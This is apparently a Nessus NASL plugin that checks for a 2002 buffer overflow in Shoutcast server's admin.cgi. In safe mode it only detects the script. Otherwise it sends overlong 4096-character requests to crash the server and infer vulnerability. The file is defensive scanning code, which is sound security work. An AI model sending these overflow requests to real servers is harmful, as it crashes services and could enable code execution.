#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
# References:
# Date:  Mon, 21 Jan 2002 22:04:58 -0800
# From: "Austin Ensminger" <skream@pacbell.net>
# Subject: Re: Shoutcast server 1.8.3 win32
# To: bugtraq@securityfocus.com
#
# http://www.egoclan.barrysworld.net/sc_crashsvr.txt
#
# Date:  19 Jan 2002 18:16:49 -0000
# From: "Brian Dittmer" <bditt@columbus.rr.com>
# To: bugtraq@securityfocus.com
# Subject: Shoutcast server 1.8.3 win32
#

if(description)
{
  script_id(11719);
  
  script_bugtraq_id(3934);
  script_cve_id("CAN-2002-0199");
  
  script_version ("$Revision: 1.3 $");
  name["english"] = "admin.cgi overflow";
  script_name(english:name["english"]);
 
  desc["english"] = "
The Shoutcast server crashes when a too long argument is 
given to admin.cgi
A cracker may use this flaw to prevent your server from
working, or worse, execute arbitrary code on your system.

Solution : upgrade Shoutcast to the latest version.

Risk factor : Serious";


  script_description(english:desc["english"]);
 
  summary["english"] = "Overflows admin.cgi";
  script_summary(english:summary["english"]);
  script_category(ACT_MIXED_ATTACK);
 
 
  script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
  family["english"] = "CGI abuses";
  family["francais"] = "Abus de CGI";
  script_family(english:family["english"], francais:family["francais"]);
  script_dependencie("find_service.nes", "no404.nasl");
  script_require_ports("Services/www", 8888);
  # Shoutcast is often on a high port
  exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
if (safe_checks())
{
  port = is_cgi_installed("admin.cgi");
  if (port)
  {
    report = "
admin.cgi was detected on this server. 
Shoutcast server installs a version that is vulnerable to
a buffer overflow.

** Note that Nessus did not try to exploit the flaw,
** so this might be a false alert.

Solution : upgrade Shoutcast to the latest version.
Risk factor : Serious";
    security_hole(port: port, data: report);
  }
  exit(0);
}


ports = add_port_in_list(list:get_kb_item("Services/www"), port:8888);
foreach port (ports)
{
 if( get_port_state(port) && !http_is_dead(port:port))
 {
  url = string("/admin.cgi?pass=", crap(length:4096, data:"\"));
  req = http_get(item: url, port:port);
  soc = http_open_socket(port);
  if (!soc)exit(0);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);

  url = string("/admin.cgi?", crap(length:4096, data:"\"));
  req = http_get(item: url, port:port);
  soc = http_open_socket(port);
  if (soc) {
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  }
  
  if (http_is_dead(port: port))
  {
   security_hole(port: port);
   exit(0);
  }
 }
}

